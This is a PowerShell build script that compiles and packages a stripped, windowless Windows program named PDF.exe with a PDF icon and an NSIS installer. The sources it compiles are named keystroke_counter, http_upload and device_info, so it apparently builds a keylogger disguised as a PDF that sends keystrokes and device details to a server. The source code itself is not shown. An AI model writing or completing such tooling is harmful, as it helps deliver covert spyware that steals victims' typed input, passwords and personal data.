param(
    [string]$Toolchain = "$PSScriptRoot\.tools\llvm-mingw-20261104-ucrt-x86_64",
    [string]$Nsis = "$PSScriptRoot\.tools\nsis-3.13",
    [string]$LlvmBin = "$Toolchain\bin"
)
$ErrorActionPreference = 'Stop'
$compiler = Join-Path $LlvmBin 'clang.exe'
$resourceCompiler = Join-Path $LlvmBin 'llvm-rc.exe'
$linker = Join-Path $LlvmBin 'ld.lld.exe'
$makensis = Join-Path $Nsis 'makensis.exe'
foreach ($tool in @($compiler, $resourceCompiler, $linker, $makensis)) {
    if (-not (Test-Path -LiteralPath $tool)) { throw "Build tool not found: $tool. See README.md." }
}
foreach ($directory in @('build', 'dist')) {
    New-Item -ItemType Directory -Path (Join-Path $PSScriptRoot $directory) -Force | Out-Null
}
if (-not (Test-Path -LiteralPath "$PSScriptRoot\assets\PDF.ico")) {
    throw 'assets\PDF.ico is missing. Regenerate it with: python tools\make_icon.py'
}
Push-Location "$PSScriptRoot\src"
try {
    & $compiler '--target=x86_64-w64-windows-gnu' '-E' '-xc' '-DRC_INVOKED' `
        '-I' "$Toolchain\include" 'PDF.rc' '-o' '..\build\PDF.preprocessed.rc'
    if ($LASTEXITCODE -ne 0) { throw 'Resource preprocessing failed' }
    & $resourceCompiler '/no-preprocess' '/fo' '..\build\PDF.res' '..\build\PDF.preprocessed.rc'
    if ($LASTEXITCODE -ne 0) { throw 'Resource compilation failed' }
    & $compiler '--target=x86_64-w64-windows-gnu' "-fuse-ld=$linker" `
        '-isystem' "$Toolchain\include" '-L' "$Toolchain\x86_64-w64-mingw32\lib" `
        '-std=c++17' '-Os' '-Wall' '-Wextra' '-Werror' '-DUNICODE' '-D_UNICODE' `
        '-D_WIN32_WINNT=0x0A00' '-fno-exceptions' '-fno-rtti' '-fno-stack-protector' `
        '-fno-unwind-tables' '-fno-asynchronous-unwind-tables' '-nostdlib' `
        'main.cpp' 'keystroke_counter.cpp' 'http_upload.cpp' 'device_info.cpp' '..\build\PDF.res' '-o' '..\dist\PDF.exe' `
        '-Wl,--subsystem,windows:6.02,--entry,EntryPoint,--dynamicbase,--nxcompat,--high-entropy-va,--no-insert-timestamp,--strip-all' `
        '-lkernel32' '-ladvapi32' '-luser32' '-lshell32' '-lole32' '-lwinhttp'
    if ($LASTEXITCODE -ne 0) { throw 'C++ compilation failed' }
} finally { Pop-Location }
Copy-Item -LiteralPath "$PSScriptRoot\assets\PDF.ico" -Destination "$PSScriptRoot\dist\PDF.ico" -Force
Push-Location "$PSScriptRoot\installer"
try {
    & $makensis '/V3' 'PDF.nsi'
    if ($LASTEXITCODE -ne 0) { throw 'Installer compilation failed' }
} finally { Pop-Location }
Get-ChildItem -LiteralPath "$PSScriptRoot\dist" -File | Select-Object Name, Length
